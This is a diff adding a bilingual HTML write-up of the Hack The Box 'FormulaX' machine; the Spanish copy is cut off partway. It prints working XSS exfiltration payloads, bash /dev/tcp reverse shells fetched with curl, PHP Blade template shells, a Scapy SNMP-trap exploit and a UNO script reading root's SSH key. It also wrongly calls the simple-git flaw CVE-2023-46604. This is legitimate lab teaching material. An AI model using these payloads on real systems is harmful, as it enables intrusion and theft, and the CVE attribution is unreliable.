@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>formulax | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">formulax</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The attack began with the discovery of a contact form vulnerable to XSS on the main web application running on port 80. Since cookies had the <code>HttpOnly</code> flag preventing direct cookie exfiltration, I crafted a sophisticated payload that injected JavaScript to exfiltrate the complete HTML of the admin panel where the XSS was executed.</p>
+                    
+                    <p>Through this exfiltrated HTML, I discovered an admin chat interface using <code>socket.io</code>. By analyzing the client-side code and replicating the socket communication protocol, I crafted a payload that connected to the WebSocket, requested the chat history, and exfiltrated all messages to my server. This revealed a subdomain: <code>dev-git-auto-update.chatbot.htb</code>.</p>
+                    
+                    <p>The subdomain ran a git cloning service powered by <code>simple-git</code> version 3.14, which is vulnerable to CVE-2023-46604 (command injection via the <code>clone</code> method). By exploiting this vulnerability with the <code>ext::sh</code> protocol handler, I achieved remote code execution as the <code>www-data</code> user.</p>
+                    
+                    <p>After initial access, I discovered MongoDB credentials in the application files and cracked the bcrypt hash for user <code>frank_dorky</code>, obtaining the password <code>manchesterunited</code>. With SSH access as this user, I discovered a LibreNMS installation (version 22.10.0) running locally on port 3000. Using the same credentials, I logged into LibreNMS and exploited a Stored XSS vulnerability combined with insecure SNMP trap handling.</p>
+                    
+                    <p>By sending a crafted SNMP trap packet containing XSS payload that executed JavaScript to create a malicious Blade template with PHP code execution, I obtained a reverse shell as the <code>librenms</code> user. In LibreNMS configuration files, I found credentials for <code>kai_relay</code>. This user had sudo privileges to execute <code>/usr/bin/office.sh</code>, which started a LibreOffice UNO server on port 2002.</p>
+                    
+                    <p>By connecting to the UNO server via Python's <code>uno</code> library and leveraging the fact that the server ran with root privileges, I was able to read arbitrary files, including <code>/root/.ssh/id_rsa</code>, by loading them as CSV documents and exporting them to PDF. With the root SSH key, I gained complete system access.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> XSS to socket.io data exfiltration, simple-git RCE (CVE-2023-46604), LibreNMS Stored XSS via SNMP trap handling, Blade template injection, LibreOffice UNO server privilege escalation with arbitrary file read.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin by performing an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image12.png" alt="Nmap scan results showing open ports including SSH on 22, HTTP on 80, and several filtered ports" /></p>
+                
+                <p>The scan reveals SSH on port 22 and an HTTP service on port 80. Let me enumerate the web application further.</p>
+                
+                <h2>Web Application Enumeration</h2>
+                <p>Accessing port 80, I see a chatbot application with the header <strong>"Your 24/7 Problem-Solving Chatbot 🤖"</strong>. Running <code>whatweb</code> provides more details about the technology stack:</p>
+                
+                <pre><code class="language-bash">whatweb http://10.10.11.6</code></pre>
+                
+                <p>The output reveals the application is powered by <strong>Express</strong> (Node.js framework) running behind an nginx reverse proxy on Ubuntu. The application redirects from the root to <code>/static/index.html</code>.</p>
+                
+                <p>Directory enumeration with <code>feroxbuster</code> reveals several interesting endpoints:</p>
+                <p><img src="./media/image9.png" alt="Feroxbuster results showing various directories and endpoints including /static, /restricted, and API routes" /></p>
+                
+                <p>Most paths return HTTP 500 errors, but the <code>/static</code> and API-related routes are accessible. After registering and logging into the application, I notice the chat functionality appears disabled for regular users:</p>
+                <p><img src="./media/image3.png" alt="Chat interface showing message that chatbot is not enabled for normal users" /></p>
+                
+                <h2>XSS Discovery and HTML Exfiltration</h2>
+                <p>The application includes a contact form that could be reviewed by an administrator. Testing for XSS vulnerabilities, I discover that the form is indeed vulnerable, but there's a challenge: cookies have the <code>HttpOnly</code> flag set, preventing direct JavaScript access.</p>
+                
+                <p>I confirm XSS execution with this payload:</p>
+                <pre><code class="language-html">&lt;img src=x onerror=fetch('http://10.10.16.2/xss') /&gt;</code></pre>
+                
+                <p>However, the initial request shows an OPTIONS method due to CORS restrictions, so I adjust the payload:</p>
+                <pre><code class="language-html">&lt;img src=x onerror=fetch('http://10.10.16.2/xss',{mode:'no-cors'}) /&gt;</code></pre>
+                
+                <p>Now I receive a clean GET request confirming code execution. Since I cannot steal cookies directly, I decide to exfiltrate the entire HTML of the admin page. I inject a payload that loads an external JavaScript file from my server:</p>
+                
+                <pre><code class="language-html">&lt;img src=x onerror="var script=document.createElement('script'); 
+script.src='http://10.10.16.2/xd.js'; 
+document.body.appendChild(script);" /&gt;</code></pre>
+                
+                <p>The <code>xd.js</code> file I serve contains:</p>
+                <pre><code class="language-javascript">fetch('http://10.10.16.2/exfil?html=' + btoa(document.documentElement.outerHTML));</code></pre>
+                
+                <p>This exfiltrates the base64-encoded HTML to my HTTP server. After decoding and opening the HTML in a browser, I see the admin interface:</p>
+                <p><img src="./media/image2.png" alt="Exfiltrated HTML showing the admin dashboard interface" /></p>
+                
+                <p>By exfiltrating <code>window.location.href</code>, I discover the admin panel runs on a virtual host: <code>http://chatbot.htb/admin/admin.html</code>. I add this to my <code>/etc/hosts</code> file.</p>
+                
+                <h2>Socket.io Data Exfiltration</h2>
+                <p>The admin panel includes a chat interface that communicates with the backend using <strong>socket.io</strong>. To exfiltrate chat messages, I need to understand and replicate the WebSocket communication protocol. Examining the JavaScript at <code>/restricted/chat.html</code>, I find the client-side code:</p>
+                
+                <p><img src="./media/image7.png" alt="JavaScript code showing socket.io implementation for the chat functionality" /></p>
+                
+                <p>The code shows how the application connects to socket.io and handles messages. I modify my <code>xd.js</code> payload to establish a socket.io connection and request chat history:</p>
+                
+                <pre><code class="language-javascript">const socketio = document.createElement('script');
+socketio.src = '/socket.io/socket.io.js';
+document.head.appendChild(socketio);
+
+socketio.addEventListener('load', () => {
+    var res = axios.get(`/user/api/chat`);
+    var socket = io('/', {withCredentials: true});
+    
+    socket.on('message', (my_message) => {
+        fetch('http://10.10.16.2/?msg=' + btoa(my_message), {mode: 'no-cors'});
+    });
+    
+    socket.emit('client_message', 'history');
+});</code></pre>
+                
+                <p>This payload first loads the socket.io client library, then establishes a connection and requests the chat history. Each message is base64-encoded and exfiltrated to my server. Decoding the received messages reveals an interesting conversation:</p>
+                
+                <pre><code class="language-plaintext">Greetings!. How can i help you today ?. You can type help to see some buildin commands
+Hello, I am Admin.Testing the Chat Application
+Write a script to automate the auto-update
+Write a script for dev-git-auto-update.chatbot.htb to work properly</code></pre>
+                
+                <p>The conversation reveals a new subdomain: <code>dev-git-auto-update.chatbot.htb</code>. I add it to my <code>/etc/hosts</code> file.</p>
+                
+                <h2>Simple-git RCE Exploitation</h2>
+                <p>Accessing the discovered subdomain, I find a git auto-update application:</p>
+                <p><img src="./media/image5.png" alt="Git auto-update interface showing repository cloning functionality" /></p>
+                
+                <p>The footer reveals crucial information: <strong>"Made with ❤ by Chatbot🤖 Using simple-git v3.14"</strong>. Researching this specific version, I discover it's vulnerable to <strong>CVE-2023-46604</strong>, a command injection vulnerability in the <code>clone</code> method.</p>
+                
+                <p><img src="./media/image8.png" alt="CVE details showing simple-git vulnerabilities for version 3.14" /></p>
+                
+                <p>According to the <a href="https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221">Snyk advisory</a>, the vulnerability allows command injection through the <code>ext::sh</code> protocol handler. Examining the JavaScript code, I see the application clones repositories using user-supplied URLs:</p>
+                
+                <pre><code class="language-javascript">const value = document.getElementById('giturl').value
+fetch('/clone', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        destinationUrl: value
+    })
+})</code></pre>
+                
+                <p>I test command execution with a simple payload:</p>
+                <pre><code class="language-plaintext">ext::sh -c wget% 10.10.16.2% >&2</code></pre>
+                
+                <p>My HTTP server receives a connection, confirming code execution. Since commands must be separated by <code>%</code> characters and some special characters break the exploit, I create a reverse shell script and serve it from my machine:</p>
+                
+                <pre><code class="language-bash">cat rev.sh
+bash -i >& /dev/tcp/10.10.16.2/443 0>&1</code></pre>
+                
+                <p>First, I download the script to the target's <code>/tmp</code> directory:</p>
+                <pre><code class="language-plaintext">ext::sh -c curl% 10.10.16.2/xd.sh% -o% /tmp/rev.sh% >&2</code></pre>
+                
+                <p>Then I execute it:</p>
+                <pre><code class="language-plaintext">ext::sh -c bash% /tmp/rev.sh% >&2</code></pre>
+                
+                <p>I receive a reverse shell as the <code>www-data</code> user.</p>
+                
+                <h2>Lateral Movement to frank_dorky</h2>
+                <p>Exploring the application files, I discover MongoDB is enabled and find bcrypt password hashes:</p>
+                
+                <pre><code class="language-plaintext">admin@chatbot.htb:$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.
+frank_dorky@chatbot.htb:$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6</code></pre>
+                
+                <p>Checking <code>/home</code>, I see two users with home directories:</p>
+                <pre><code class="language-bash">ls -la /home
+drwxr-x--- 6 frank_dorky frank_dorky 4096 Feb 19 2024 frank_dorky
+drwxr-x--- 12 kai_relay kai_relay 4096 Feb 20 2024 kai_relay</code></pre>
+                
+                <p>Additionally, I notice a <code>librenms</code> user who owns files in <code>/opt</code>:</p>
+                <pre><code class="language-bash">drwxrwx--x 27 librenms librenms 4096 Feb 19 2024 librenms</code></pre>
+                
+                <p>Using hashcat, I successfully crack frank_dorky's password:</p>
+                <pre><code class="language-plaintext">frank_dorky:manchesterunited</code></pre>
+                
+                <p>With SSH access as <code>frank_dorky</code>, I retrieve the user flag.</p>
+                
+                <h2>Discovering LibreNMS</h2>
+                <p>Checking for locally listening services, I discover several interesting ports:</p>
+                <p><img src="./media/image6.png" alt="Netstat output showing multiple local services including ports 3000, 8000, and others" /></p>
+                
+                <p>Process inspection reveals <code>puppeteer</code> is running (likely for the XSS testing on port 37683). By examining <code>/etc/nginx/conf.d/librenms.conf</code>, I determine that port 3000 hosts a LibreNMS installation with its document root at <code>/opt/librenms/html</code>.</p>
+                
+                <p>I set up SSH local port forwarding to access both port 3000 (LibreNMS) and port 8000 (another custom application):</p>
+                <pre><code class="language-bash">ssh -L 3000:localhost:3000 -L 8000:localhost:8000 frank_dorky@10.10.11.6</code></pre>
+                
+                <p>Running <code>whatweb</code> on port 3000 confirms LibreNMS is running with PHP/Laravel:</p>
+                <pre><code class="language-bash">whatweb http://localhost:3000
+http://localhost:3000/login [200 OK] Bootstrap, Laravel, LibreNMS</code></pre>
+                
+                <p>The credentials for <code>frank_dorky</code> work on the LibreNMS login, and I can see the version is <strong>22.10.0</strong>.</p>
+                
+                <h2>LibreNMS Privilege Escalation - Method 1 (Unintended)</h2>
+                <p>While the user <code>frank_dorky</code> cannot read files in <code>/opt/librenms</code>, I can execute files within it. LibreNMS includes an <code>adduser.php</code> script for creating administrative users.</p>
+                
+                <p>Following the guidance from the <a href="https://community.librenms.org/t/adding-admin-users-on-librenms/20782">LibreNMS community forum</a>, I create an admin user:</p>
+                
+                <pre><code class="language-bash">cd /opt/librenms
+./adduser.php xd xd 10
+User xd added successfully</code></pre>
+                
+                <p>The parameter <code>10</code> grants full administrator privileges. After logging in, I can create alert templates, which support Blade PHP syntax - meaning I can inject arbitrary PHP code.</p>
+                
+                <p>However, I encounter console errors related to hostname mismatches. To fix this, I modify my local <code>/etc/hosts</code> to point <code>librenms.com</code> to localhost:</p>
+                
+                <p><img src="./media/image11.png" alt="Browser console showing hostname-related errors" /></p>
+                
+                <p>After fixing the hostname issue, I modify an alert template to include a PHP reverse shell:</p>
+                <p><img src="./media/image4.png" alt="Alert template editor showing injected PHP code for reverse shell" /></p>
+                
+                <p>The payload I inject is:</p>
+                <pre><code class="language-php">@php
+system("bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'");
+@endphp</code></pre>
+                
+                <p>When I save the template, the Blade template engine executes my PHP code, and I receive a reverse shell as the <code>librenms</code> user.</p>
+                
+                <h2>LibreNMS Privilege Escalation - Method 2 (Intended Path)</h2>
+                <p>The intended exploitation path involves chaining a Stored XSS vulnerability with SNMP trap handling. LibreNMS supports <a href="https://docs.librenms.org/Extensions/SNMP-Trap-Handler/">SNMP trap handlers</a>, and the trap data displayed in the dashboard is not properly sanitized.</p>
+                
+                <p>According to detailed analyses by <a href="https://www.sonarsource.com/blog/it-s-a-snmp-trap-gaining-code-execution-on-librenms/">SonarSource</a> and <a href="https://vulners.com/huntr/0C24BB60-4A8F-454F-9534-BA21B7470B55">Vulners</a>, I can exploit this by:</p>
+                
+                <ol>
+                    <li>Sending a malicious SNMP trap packet containing XSS payload</li>
+                    <li>The XSS executes in the admin's browser when viewing the trap dashboard</li>
+                    <li>The XSS payload sends a POST request to create a malicious Blade template</li>
+                    <li>The Blade template contains PHP code for a reverse shell</li>
+                </ol>
+                
+                <p>First, I need to identify which device LibreNMS accepts traps from. Checking <code>http://localhost:3000/maps/devicedependency</code>, I see it's <code>10.10.11.240</code>.</p>
+                
+                <p>I create a Python script using Scapy to send the malicious SNMP trap:</p>
+                
+                <pre><code class="language-python">#!/usr/bin/env python3
+from scapy.all import *
+
+TARGET = '10.10.11.6'
+SOURCE = '10.10.11.240'
+PAYLOAD = 'system&lt;script src=http://10.10.16.2/payload.js&gt;&lt;/script&gt;'
+
+vl = []
+vl.append(SNMPvarbind(oid=ASN1_OID('1.3.6.1.6.3.1.1.4.1.0'), 
+                      value=ASN1_OID('1.2.3')))
+vl.append(SNMPvarbind(oid='', 
+                      value='foo\nSNMPv2-MIB::snmpTrapOID.0 HP-ICF-FAULT-FINDER-MIB::hpicfFaultFinderTrap\nHP-ICF-FAULT-FINDER-MIB::hpicfFfLogFaultType ' + PAYLOAD))
+
+s = SNMP(version=1, PDU=SNMPtrapv2(varbindlist=vl))
+p = IP(src=SOURCE, dst=TARGET)/UDP(dport=162)/s
+send(p)</code></pre>
+                
+                <p>The XSS payload loads <code>payload.js</code> from my server, which contains:</p>
+                
+                <pre><code class="language-javascript">fetch('http://127.0.0.1:3000/ajax_form.php', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'type=alert-templates&template=@php%20system("bash%20-c%20\'bash%20-i%20>%26%20/dev/tcp/10.10.16.2/443%200>%261\'");%20@endphp&name=Foo'
+});</code></pre>
+                
+                <p>This JavaScript sends a POST request to create a Blade template with a reverse shell. After setting up HTTP and netcat listeners, I execute the Python script:</p>
+                
+                <pre><code class="language-bash">python3 snmptrap.py
+.
+Sent 1 packets.</code></pre>
+                
+                <p>Shortly after, I receive the reverse shell as the <code>librenms</code> user.</p>
+                
+                <h2>Lateral Movement to kai_relay</h2>
+                <p>In <code>/opt/librenms</code>, I discover a <code>.custom.env</code> file containing credentials:</p>
+                <pre><code class="language-plaintext">kai_relay:mychemicalformulaX</code></pre>
+                
+                <p>Checking <code>kai_relay</code>'s sudo privileges reveals an interesting permission:</p>
+                
+                <pre><code class="language-bash">sudo -l
+User kai_relay may run the following commands on forumlax:
+    (ALL) NOPASSWD: /usr/bin/office.sh</code></pre>
+                
+                <p>Examining the script shows it starts a LibreOffice headless server with UNO protocol support:</p>
+                
+                <pre><code class="language-bash">cat /usr/bin/office.sh
+#!/bin/bash
+/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless</code></pre>
+                
+                <p>The version is LibreOffice 7.3.7.2. Using kai_relay's credentials, I can also access the custom application on port 8000:</p>
+                <p><img src="./media/image10.png" alt="Office application interface showing file creation capabilities" /></p>
+                <p><img src="./media/image1.png" alt="Application instructions explaining the UNO server functionality" /></p>
+                
+                <p>This application allows creating and downloading office documents. The green "Start instance" button executes <code>sudo /usr/bin/office.sh</code>, starting a UNO server on port 2002.</p>
+                
+                <h2>Privilege Escalation via LibreOffice UNO</h2>
+                <p>LibreOffice UNO (Universal Network Objects) allows programmatic control of LibreOffice. Since the UNO server runs with root privileges (via sudo), I can potentially access root-owned files.</p>
+                
+                <p>Testing the port shows it responds with UNO protocol data:</p>
+                <pre><code class="language-bash">nc localhost 2002
+i��'com.sun.star.bridge.XProtocolPropertiesUrpProtocolProperties...</code></pre>
+                
+                <p>While researching UNO exploits, I find <a href="https://www.exploit-db.com/exploits/46544">a related exploit</a>, but I need to adapt it for arbitrary file reading. After some research and testing, I create a working Python script using the <code>uno</code> library:</p>
+                
+                <pre><code class="language-python">import uno
+from com.sun.star.connection import NoConnectException
+from com.sun.star.beans import PropertyValue
+
+def load_file_as_csv(file_path, output_pdf_path):
+    """Loads a text file into LibreOffice Calc as CSV and saves as PDF."""
+    connection_string = "uno:socket,host=localhost,port=2002;urp;StarOffice.ComponentContext"
+    
+    try:
+        local_context = uno.getComponentContext()
+        resolver = local_context.ServiceManager.createInstanceWithContext(
+            "com.sun.star.bridge.UnoUrlResolver", local_context)
+        context = resolver.resolve(connection_string)
+        smgr = context.ServiceManager
+        desktop = smgr.createInstanceWithContext("com.sun.star.frame.Desktop", context)
+        
+        # Load file as CSV
+        load_props = (
+            PropertyValue("FilterName", 0, "Text - txt - csv (StarCalc)", 0),
+            PropertyValue("FilterOptions", 0, "44,34,0,1", 0),
+        )
+        
+        document = desktop.loadComponentFromURL("file://" + file_path, 
+                                                "_blank", 0, load_props)
+        
+        # Export as PDF
+        pdf_export_props = (PropertyValue("FilterName", 0, "calc_pdf_Export", 0),)
+        document.storeToURL("file://" + output_pdf_path, pdf_export_props)
+        document.dispose()
+        
+        print(f"Document loaded as CSV and saved as PDF to {output_pdf_path}")
+        
+    except NoConnectException:
+        print("Failed to connect to LibreOffice on port 2002.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+if __name__ == "__main__":
+    file_path = "/root/.ssh/id_rsa"
+    output_pdf_path = "/tmp/output_document.pdf"
+    load_file_as_csv(file_path, output_pdf_path)</code></pre>
+                
+                <p>This script connects to the UNO server, loads <code>/root/.ssh/id_rsa</code> as a CSV document (which preserves the content), and exports it as a PDF to <code>/tmp/output_document.pdf</code> where I have read access.</p>
+                
+                <p>After running the script, I download the PDF, extract the SSH private key, save it with proper permissions, and gain root access:</p>
+                
+                <pre><code class="language-bash">chmod 600 id_rsa
+ssh -i id_rsa root@10.10.11.6</code></pre>
+                
+                <p>With root access obtained, I can retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> El ataque comenzó con el descubrimiento de un formulario de contacto vulnerable a XSS en la aplicación web principal ejecutándose en el puerto 80. Como las cookies tenían la flag <code>HttpOnly</code> impidiendo la exfiltración directa de cookies, diseñé un payload sofisticado que inyectaba JavaScript para exfiltrar el HTML completo del panel de administración donde se ejecutaba el XSS.</p>
+                    
+                    <p>A través de este HTML exfiltrado, descubrí una interfaz de chat de administrador usando <code>socket.io</code>. Analizando el código del lado del cliente y replicando el protocolo de comunicación del socket, creé un payload que se conectaba al WebSocket, solicitaba el historial del chat y exfiltraba todos los mensajes a mi servidor. Esto reveló un subdominio: <code>dev-git-auto-update.chatbot.htb</code>.</p>
+                    
+                    <p>El subdominio ejecutaba un servicio de clonado de git impulsado por <code>simple-git</code> versión 3.14, que es vulnerable a CVE-2023-46604 (inyección de comandos a través del método <code>clone</code>). Explotando esta vulnerabilidad con el manejador de protocolo <code>ext::sh</code>, conseguí ejecución remota de código como usuario <code>www-data</code>.</p>
+                    
+                    <p>Tras el acceso inicial, descubrí credenciales de MongoDB en los archivos de la aplicación y crackeé el hash bcrypt del usuario <code>frank_dorky</code>, obteniendo la contraseña <code>manchesterunited</code>. Con acceso SSH como este usuario, descubrí una instalación de LibreNMS (versión 22.10.0) ejecutándose localmente en el puerto 3000. Usando las mismas credenciales, accedí a LibreNMS y exploté una vulnerabilidad de XSS almacenado combinada con manejo inseguro de traps SNMP.</p>
+                    
+                    <p>Enviando un paquete SNMP trap diseñado específicamente conteniendo un payload XSS que ejecutaba JavaScript para crear una plantilla Blade maliciosa con ejecución de código PHP, obtuve una reverse shell como usuario <code>librenms</code>. En los archivos de configuración de LibreNMS, encontré credenciales para <code>kai_relay</code>. Este usuario tenía privilegios sudo para ejecutar <code>/usr/bin/office.sh</code>, que iniciaba un servidor UNO de LibreOffice en el puerto 2002.</p>
+                    
+                    <p>Conectándome al servidor UNO mediante la librería <code>uno</code> de Python y aprovechando que el servidor se ejecutaba con privilegios de root, pude leer archivos arbitrarios, incluyendo <code>/root/.ssh/id_rsa</code>, cargándolos como documentos CSV y exportándolos a PDF. Con la clave SSH de root, obtuve acceso completo al sistema.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> XSS a exfiltración de datos socket.io, RCE simple-git (CVE-2023-46604), XSS almacenado LibreNMS mediante manejo de SNMP trap, inyección de plantilla Blade, escalada de privilegios del servidor UNO de LibreOffice con lectura de archivos arbitraria.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo realizando un escaneo nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image12.png" alt="Resultados del escaneo nmap mostrando puertos abiertos incluyendo SSH en el 22, HTTP en el 80, y varios puertos filtrados" /></p>
+                
+                <p>El escaneo revela SSH en el puerto 22 y un servicio HTTP en el puerto 80. Voy a enumerar la aplicación web con más detalle.</p>
+                
+                <h2>Enumeración de la Aplicación Web</h2>
+                <p>Accediendo al puerto 80, veo una aplicación de chatbot con el encabezado <strong>"Your 24/7 Problem-Solving Chatbot 🤖"</strong>. Ejecutando <code>whatweb</code> proporciona más detalles sobre la pila tecnológica:</p>
+                
+                <pre><code class="language-bash">whatweb http://10.10.11.6</code></pre>
+                
+                <p>La salida revela que la aplicación está impulsada por <strong>Express</strong> (framework Node.js) ejecutándose detrás de un proxy inverso nginx en Ubuntu. La aplicación redirige desde la raíz a <code>/static/index.html</code>.</p>
+                
+                <p>La enumeración de directorios con <code>feroxbuster</code> revela varios endpoints interesantes:</p>
+                <p><img src="./media/image9.png" alt="Resultados de feroxbuster mostrando varios directorios y endpoints incluyendo /static, /restricted y rutas de API" /></p>
+                
+                <p>La mayoría de rutas devuelven errores HTTP 500, pero las rutas <code>/static</code> y relacionadas con la API son accesibles. Tras registrarme y hacer login en la aplicación, noto que la funcionalidad del chat parece deshabilitada para usuarios regulares:</p>
+                <p><img src="./media/image3.png" alt="Interfaz del chat mostrando mensaje de que el chatbot no está habilitado para usuarios normales" /></p>
+                
+                <h2>Descubrimiento de XSS y Exfiltración de HTML</h2>
+                <p>La aplicación incluye un formulario de contacto que podría ser revisado por un administrador. Probando vulnerabilidades XSS, descubro que el formulario es vulnerable, pero hay un desafío: las cookies tienen la flag <code>HttpOnly</code> establecida, impidiendo el acceso directo mediante JavaScript.</p>
+                
+                <p>Confirmo la ejecución de XSS con este payload:</p>
+                <pre><code class="language-html">&lt;img src=x onerror=fetch('http://10.10.16.2/xss') /&gt;</code></pre>
+                
+                <p>Sin embargo, la petición inicial muestra un método OPTIONS debido a restricciones CORS, así que ajusto el payload:</p>
+                <pre><code class="language-html">&lt;img src=x onerror=fetch('http://10.10.16.2/xss',{mode:'no-cors'}) /&gt;</code></pre>
+                
+                <p>Ahora recibo una petición GET limpia confirmando la ejecución de código. Como no puedo robar cookies directamente, decido exfiltrar el HTML completo de la página del administrador. Inyecto un payload que carga un archivo JavaScript externo desde mi servidor:</p>
+                
+                <pre><code class="language-html">&lt;img src=x onerror="var script=document.createElement('script'); 
+script.src='http://10.10.16.2/xd.js'; 
+document.body.appendChild(script);" /&gt;</code></pre>
+                
+                <p>El archivo <code>xd.js</code> que sirvo contiene:</p>
+                <pre><code class="language-javascript">fetch('http://10.10.16.2/exfil?html=' + btoa(document.documentElement.outerHTML));</code></pre>
+                
+                <p>Esto exfiltra el HTML codificado en base64 a mi servidor HTTP. Tras decodificar y abrir el HTML en un navegador, veo la interfaz del administrador:</p>
+                <p><img src="./media/image2.png" alt="HTML exfiltrado mostrando la interfaz del panel de administración" /></p>
+                
+                <p>Exfiltrando <code>window.location.href</code>, descubro que el panel de administración se ejecuta en un host virtual: <code>http://chatbot.htb/admin/admin.html</code>. Lo añado a mi archivo <code>/etc/hosts</code>.</p>
+                
+                <h2>Exfiltración de Datos Socket.io</h2>
+                <p>El panel de administración incluye una interfaz de chat que se comunica con el backend usando <strong>socket.io</strong>. Para exfiltrar mensajes del chat, necesito entender y replicar el protocolo de comunicación WebSocket. Examinando el JavaScript en <code>/restricted/chat.html</code>, encuentro el código del lado del cliente:</p>
+                
+                <p><img src="./media/image7.png" alt="Código JavaScript mostrando la implementación de socket.io para la funcionalidad del chat" /></p>
+                
+                <p>El código muestra cómo la aplicación se conecta a socket.io y maneja mensajes. Modifico mi payload <code>xd.js</code> para establecer una conexión socket.io y solicitar el historial del chat:</p>
+                
+                <pre><code class="language-javascript">const socketio = document.createElement('script');
+socketio.src = '/socket.io/socket.io.js';
+document.head.appendChild(socketio);
+
+socketio.addEventListener('load', () => {
+    var res = axios.get(`/user/api/chat`);
+    var socket = io('/', {withCredentials: true});
+    
+    socket.on('message', (my_message) => {
+        fetch('http://10.10.16.2/?msg=' + btoa(my_message), {mode: 'no-cors'});
+    });
+    
+    socket.emit('client_message', 'history');
+});</code></pre>
+                
+                <p>Este payload primero carga la librería cliente socket.io, luego establece una conexión y solicita el historial del chat. Cada mensaje se codifica en base64 y se exfiltra a mi servidor. Decodificando los mensajes recibidos revela una conversación interesante:</p>
+                
+                <pre><code class="language-plaintext">Greetings!. How can i help you today ?. You can type help to see some buildin commands
+Hello, I am Admin.Testing the Chat Application
+Write a script to automate the auto-update
+Write a script for dev-git-auto-update.chatbot.htb to work properly</code></pre>
+                
+                <p>La conversación revela un nuevo subdominio: <code>dev-git-auto-update.chatbot.htb</code>. Lo añado a mi archivo <code>/etc/hosts</code>.</p>
+                
+                <h2>Explotación RCE de Simple-git</h2>
+                <p>Accediendo al subdominio descubierto, encuentro una aplicación de auto-actualización git:</p>
+                <p><img src="./media/image5.png" alt="Interfaz de auto-actualización git mostrando funcionalidad de clonado de repositorio" /></p>
+                
+                <p>El pie de página revela información crucial: <strong>"Made with ❤ by Chatbot🤖 Using simple-git v3.14"</strong>. Investigando esta versión específica, descubro que es vulnerable a <strong>CVE-2023-46604</strong>, una vulnerabilidad de inyección de comandos en el método <code>clone</code>.</p>
+                
+                <p><img src="./media/image8.png" alt="Detalles de CVE mostrando vulnerabilidades de simple-git para la versión 3.14" /></p>
+                
+                <p>Según el <a href="https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221">aviso de Snyk</a>, la vulnerabilidad permite inyección de comandos a través del manejador de protocolo <code>ext::sh</code>. Examinando el código JavaScript, veo que la aplicación clona repositorios usando URLs proporcionadas por el usuario:</p>
+                
+                <pre><code class="language-javascript">const value = document.getElementById('giturl').value
+fetch('/clone', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        destinationUrl: value
+    })
+})</code></pre>
+                
+                <p>Pruebo la ejecución de comandos con un payload simple:</p>
+                <pre><code class="language-plaintext">ext::sh -c wget% 10.10.16.2% >&2</code></pre>
+                
+                <p>Mi servidor HTTP recibe una conexión, confirmando la ejecución de código. Como los comandos deben estar separados por caracteres <code>%</code> y algunos caracteres especiales rompen el exploit, creo un script de reverse shell y lo sirvo desde mi máquina:</p>
+                
+                <pre><code class="language-bash">cat rev.sh
+bash -i >& /dev/tcp/10.10.16.2/443 0>&1</code></pre>
+                
+                <p>Primero, descargo el script al directorio <code>/tmp</code> del objetivo:</p>
+                <pre><code class="language-plaintext">ext::sh -c curl% 10.10.16.2/xd.sh% -o% /tmp/rev.sh% >&2</code></pre>
+                
+                <p>Luego lo ejecuto:</p>
+                <pre><code class="language-plaintext">ext::sh -c bash% /tmp/rev.sh% >&2</code></pre>
+                
+                <p>Recibo una reverse shell como usuario <code>www-data</code>.</p>
+                
+                <h2>Movimiento Lateral a frank_dorky</h2>
+                <p>Explorando los archivos de la aplicación, descubro que MongoDB está habilitado y encuentro hashes de contraseñas bcrypt:</p>
+                
+                <pre><code class="language-plaintext">admin@chatbot.htb:$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.
+frank_dorky@chatbot.htb:$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6</code></pre>
+                
